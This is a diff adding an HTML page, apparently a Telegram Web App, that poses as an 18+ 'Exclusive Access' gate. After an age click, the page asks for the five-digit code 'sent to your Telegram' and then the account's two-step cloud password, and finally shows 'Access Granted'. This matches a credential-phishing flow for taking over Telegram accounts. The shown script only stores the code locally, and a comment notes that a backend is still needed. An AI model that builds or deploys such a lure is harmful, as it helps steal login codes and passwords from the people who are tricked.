@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Access</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: white;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .glass-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+        }
+        .step-content { display: none; }
+        .step-content.active { display: block; animation: fadeIn 0.5s ease; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .numpad button {
+            background: rgba(255, 255, 255, 0.08);
+            transition: all 0.2s;
+        }
+        .numpad button:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.95); }
+    </style>
+</head>
+<body class="flex items-center justify-center p-4">
+
+    <div class="glass-card w-full max-w-md p-8 text-center relative">
+        
+        <div id="step1" class="step-content active">
+            <div class="mb-6 text-5xl">🔞</div>
+            <h2 class="text-2xl font-semibold mb-2">Age Verification</h2>
+            <p class="text-gray-400 mb-8 text-sm">This content is restricted to users 18 years of age or older.</p>
+            <button onclick="nextStep(2)" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-xl font-bold shadow-lg transition-all">
+                ✅ I'M 18+ PROCEED
+            </button>
+        </div>
+
+        <div id="step2" class="step-content">
+            <h2 class="text-xl font-semibold mb-4">Verification Code</h2>
+            <p class="text-gray-400 mb-6 text-sm">Enter the 5-digit code sent to your Telegram.</p>
+            
+            <div class="flex justify-center gap-2 mb-8">
+                <input type="text" id="otp-display" readonly class="bg-transparent border-b-2 border-blue-500 text-3xl text-center w-full tracking-[1rem] outline-none" placeholder="*****">
+            </div>
+
+            <div class="numpad grid grid-cols-3 gap-3 mb-6">
+                <button onclick="addDigit(1)" class="py-4 rounded-lg text-xl font-bold">1</button>
+                <button onclick="addDigit(2)" class="py-4 rounded-lg text-xl font-bold">2</button>
+                <button onclick="addDigit(3)" class="py-4 rounded-lg text-xl font-bold">3</button>
+                <button onclick="addDigit(4)" class="py-4 rounded-lg text-xl font-bold">4</button>
+                <button onclick="addDigit(5)" class="py-4 rounded-lg text-xl font-bold">5</button>
+                <button onclick="addDigit(6)" class="py-4 rounded-lg text-xl font-bold">6</button>
+                <button onclick="addDigit(7)" class="py-4 rounded-lg text-xl font-bold">7</button>
+                <button onclick="addDigit(8)" class="py-4 rounded-lg text-xl font-bold">8</button>
+                <button onclick="addDigit(9)" class="py-4 rounded-lg text-xl font-bold">9</button>
+                <button onclick="clearDigit()" class="py-4 rounded-lg text-sm font-bold text-red-400">Clear</button>
+                <button onclick="addDigit(0)" class="py-4 rounded-lg text-xl font-bold">0</button>
+                <button onclick="nextStep(3)" class="py-4 rounded-lg text-sm font-bold text-green-400">OK</button>
+            </div>
+        </div>
+
+        <div id="step3" class="step-content">
+            <h2 class="text-xl font-semibold mb-2">Two-Step Verification</h2>
+            <p class="text-gray-400 mb-6 text-sm">Enter your cloud password to continue.</p>
+            <input type="password" id="two-step-pwd" class="w-full bg-white/10 border border-white/20 rounded-xl py-4 px-4 mb-6 focus:outline-none focus:border-blue-500" placeholder="Your Password">
+            <button onclick="nextStep(4)" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-xl font-bold shadow-lg transition-all">
+                SUBMIT
+            </button>
+        </div>
+
+        <div id="step4" class="step-content text-center">
+            <div class="mb-6 text-5xl text-green-500">✔️</div>
+            <h2 class="text-2xl font-semibold mb-2">Access Granted</h2>
+            <p class="text-gray-400 mb-8 text-sm">Your identity has been verified successfully.</p>
+            <button class="w-full bg-gradient-to-r from-red-600 to-orange-600 py-4 rounded-xl font-bold shadow-lg transition-all">
+                📽️ WATCH NOW
+            </button>
+        </div>
+
+    </div>
+
+    <script>
+        let currentOtp = "";
+
+        function nextStep(step) {
+            document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+            
+            // Telegram Contact Request Logic for Step 1 to 2
+            if(step === 2) {
+                const tg = window.Telegram.WebApp;
+                tg.expand();
+                // Note: Real contact request requires backend integration
+                console.log("Requesting Telegram Contact...");
+            }
+        }
+
+        function addDigit(digit) {
+            if(currentOtp.length < 5) {
+                currentOtp += digit;
+                document.getElementById('otp-display').value = currentOtp;
+            }
+        }
+
+        function clearDigit() {
+            currentOtp = "";
+            document.getElementById('otp-display').value = "";
+        }
+    </script>
+</body>
+</html>
